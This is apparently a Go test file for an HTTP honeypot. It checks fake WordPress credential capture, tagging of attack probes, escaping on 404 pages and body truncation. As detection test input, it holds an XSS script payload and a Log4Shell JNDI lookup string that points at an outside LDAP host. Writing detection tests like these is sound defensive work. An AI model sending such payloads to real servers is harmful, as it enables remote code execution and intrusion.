package httppot

import (
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"

	"github.com/born2feel/honeynet/internal/event"
)

func serve(t *testing.T, req *http.Request) (*httptest.ResponseRecorder, event.Event) {
	t.Helper()
	var got []event.Event
	srv := New(Config{Hostname: "web-01"}, event.EmitterFunc(func(e event.Event) { got = append(got, e) }),
		slog.New(slog.NewTextHandler(io.Discard, nil)))
	rec := httptest.NewRecorder()
	srv.ServeHTTP(rec, req)
	if len(got) != 1 {
		t.Fatalf("want 1 event, got %d", len(got))
	}
	return rec, got[0]
}

func TestWordPressLoginCaptured(t *testing.T) {
	req := httptest.NewRequest("POST", "/wp-login.php", strings.NewReader("log=admin&pwd=hunter2&wp-submit=Log+In"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "python-requests/2.31.0")
	rec, e := serve(t, req)

	if e.Username != "admin" || e.Password != "hunter2" {
		t.Errorf("credentials: %q / %q", e.Username, e.Password)
	}
	for _, tag := range []string{"wordpress", "credential_capture", "scanner"} {
		if !slices.Contains(e.Tags, tag) {
			t.Errorf("missing tag %q in %v", tag, e.Tags)
		}
	}
	if !strings.Contains(rec.Body.String(), "login_error") {
		t.Error("failed login should re-render the form with an error")
	}
	if rec.Header().Get("Server") != "Apache/2.4.52 (Ubuntu)" {
		t.Errorf("server header: %q", rec.Header().Get("Server"))
	}
}

func TestNotFoundEscapesPath(t *testing.T) {
	rec, e := serve(t, httptest.NewRequest("GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", nil))
	if rec.Code != http.StatusNotFound {
		t.Errorf("status %d", rec.Code)
	}
	if !slices.Contains(e.Tags, "xss") {
		t.Errorf("xss not detected: %v", e.Tags)
	}
	req := httptest.NewRequest("GET", "/<b>x</b>", nil)
	rec, _ = serve(t, req)
	if strings.Contains(rec.Body.String(), "<b>x</b>") {
		t.Error("404 page reflects unescaped input")
	}
}

func TestLog4ShellInHeader(t *testing.T) {
	req := httptest.NewRequest("GET", "/", nil)
	req.Header.Set("User-Agent", "${jndi:ldap://203.0.113.1:1389/a}")
	_, e := serve(t, req)
	if !slices.Contains(e.Tags, "log4shell") {
		t.Errorf("log4shell not detected: %v", e.Tags)
	}
}

func TestBodyIsBounded(t *testing.T) {
	req := httptest.NewRequest("POST", "/upload", strings.NewReader(strings.Repeat("A", 1<<20)))
	_, e := serve(t, req)
	if len(e.Body) > maxBody+8 {
		t.Errorf("body not truncated: %d", len(e.Body))
	}
}
